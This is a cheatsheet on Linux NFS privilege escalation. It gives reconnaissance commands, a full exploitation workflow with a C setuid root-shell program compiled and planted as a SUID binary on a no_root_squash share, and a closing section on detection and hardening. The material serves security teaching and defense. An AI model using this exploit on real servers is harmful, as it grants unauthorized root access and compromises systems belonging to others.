## 📁 Cheatsheet: NFS Privilege Escalation

NFS (Network File System) allows a client system to access files over a network as if they were on its local storage. The most critical misconfiguration is **`no_root_squash`**. By default, NFS "squashes" a client's root user, mapping them to a low-privilege `nobody` user on the server. When `no_root_squash` is enabled, the server trusts the client's root user, treating them as the server's own root user on the shared directory. This allows the attacker to create a root-owned SUID binary.

### ## What to Look For (Reconnaissance)

An attacker needs to find open NFS shares and check their configuration.

* **Scan for NFS Shares from a Client Machine:**
    The `showmount` command lists the available shares on an NFS server.
    ```bash
    showmount -e <SERVER_IP>
    # Example Output:
    # Export list for <SERVER_IP>:
    # /home/share *
    # /tmp        192.168.1.0/24
    ```

* **Check the `/etc/exports` File on the Server:**
    If an attacker has initial low-privilege access to the server, they can read this file to see the exact configuration of all shares.
    ```bash
    cat /etc/exports
    # Look for the 'no_root_squash' option. This is the vulnerability.
    # Vulnerable line: /home/share *(rw,sync,no_root_squash)
    ```

* **Check for Already Mounted Shares:**
    ```bash
    mount | grep nfs
    ```

---

### ## Exploitation Workflow (`no_root_squash`)

This attack involves creating a SUID executable on the share from a client machine where the attacker has root privileges.

1.  **On the Attacker's Machine (as root):**
    First, create a local directory to mount the share.
    ```bash
    mkdir /tmp/nfs_share
    ```

2.  **Mount the Insecure Share:**
    Mount the NFS share identified during reconnaissance.
    ```bash
    mount -t nfs <SERVER_IP>:/home/share /tmp/nfs_share/
    ```

3.  **Create and Compile a Malicious Payload:**
    Write a simple C program (`shell.c`) that spawns a shell.
    ```c
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>

    int main() {
        setuid(0);
        setgid(0);
        system("/bin/bash -p");
        return 0;
    }
    ```
    Compile it on your attacker machine.
    ```bash
    gcc shell.c -o shell
    ```

4.  **Create the SUID Binary on the Share:**
    Copy the compiled binary to the mounted share and set the SUID bit. Because of `no_root_squash`, the file will be owned by `root` on the server.
    ```bash
    cp shell /tmp/nfs_share/
    chmod u+s /tmp/nfs_share/shell
    ```

5.  **On the Victim Server (as any user):**
    Now, log into the server with your low-privilege shell. Navigate to the directory that is being shared via NFS.

6.  **Execute the Payload and Get Root:**
    Run the SUID binary you created. It will execute with root privileges.
    ```bash
    cd /home/share
    ./shell
    whoami
    # Output: root
    ```

---

### ## 🛡️ Detection & Remediation (For Defenders)

#### **How to Detect an Attempt**

* **File Integrity Monitoring (FIM):** Monitor exported directories for the creation of new files with the SUID bit set. This is a massive indicator of compromise.
* **NFS Logging:** Review NFS server logs for unusual activity or connections from untrusted IP ranges.

#### **How to Prevent NFS Abuse**

* **Always Use `root_squash`:** This is the most critical defense. `root_squash` is the default setting in most modern Linux distributions for a reason. **Never** use `no_root_squash` unless you have an explicit and well-understood reason.
* **Use `nosuid` and `noexec`:** Configure shares to prevent SUID execution.
    * **Server-Side (`/etc/exports`):** Add the `nosuid` option to your exports.
        ```
        # Bad:
        /home/share *(rw,no_root_squash)
        # Good:
        /home/share 192.168.1.100(rw,root_squash,nosuid)
        ```
    * **Client-Side (`mount` command):** When mounting shares, always include the `nosuid` and `noexec` options.
        ```bash
        sudo mount -t nfs -o nosuid,noexec <SERVER_IP>:/share /mnt/share
        ```

* **Principle of Least Privilege:** Only export directories that absolutely need to be shared. If possible, export them as read-only (`ro`).
* **Use a Firewall:** Restrict access to NFS ports (TCP/UDP 2049 for NFS and 111 for the portmapper) to only trusted client IP addresses or ranges.
